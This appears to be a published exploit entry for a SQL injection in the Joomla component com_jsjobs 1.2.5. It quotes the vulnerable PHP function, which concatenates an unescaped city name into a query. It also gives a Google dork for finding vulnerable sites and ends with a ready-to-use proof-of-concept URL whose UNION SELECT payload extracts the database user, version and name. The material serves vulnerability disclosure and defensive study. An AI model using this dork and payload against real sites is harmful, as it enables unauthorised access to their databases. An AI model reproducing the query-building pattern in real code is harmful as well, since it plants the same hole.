@@ -1,0 +1,40 @@
+#Exploit Title: Joomla! component com_jsjobs - SQL Injection
+#Dork: inurl:"index.php?option=com_jsjobs"
+#Date: 11.08.19
+#Exploit Author: qw3rTyTy
+#Vendor Homepage: https://www.joomsky.com/
+#Software Link: https://www.joomsky.com/5/download/1
+#Version: 1.2.5
+#Tested on: Debian/nginx/joomla 3.9.0
+#####################################
+#Vulnerability details:
+#####################################
+Vulnerable code is in line 296 in file site/models/cities.php
+
+   291	    function isCityExist($countryid, $stateid, $cityname){
+   292	        if (!is_numeric($countryid))
+   293	            return false;
+   294	
+   295	        $db = $this->getDBO();
+   296		$query = "SELECT id,name,latitude,longitude FROM `#__js_job_cities` WHERE countryid=" . $countryid . " AND LOWER(name) = '" . strtolower($cityname) . "'";	//!!!
+   297	
+   298	        if($stateid > 0){
+   299	            $query .= " AND stateid=".$stateid;
+   300	        }else{
+   301	            $query .= " AND (stateid=0 OR stateid IS NULL)";
+   302		}
+   303		
+   305	        $db->setQuery($query);
+   306	        $city = $db->loadObject();
+   307	        if ($city != null)
+   308	            return $city;
+   309	        else
+   310	            return false;
+   311	    }
+   312	
+   313	}
+
+#####################################
+#PoC:
+#####################################
+http://localhost/index.php?option=com_jsjobs&task=cities.savecity&citydata=%27%20UNION%20SELECT%20*%20FROM%20(SELECT%20user())%20AS%20a%20JOIN%20(SELECT%20version())%20as%20b%20JOIN%20(SELECT%20database())%20as%20c%20JOIN%20(SELECT%20%27woot%27)%20as%20d--%20,Canada
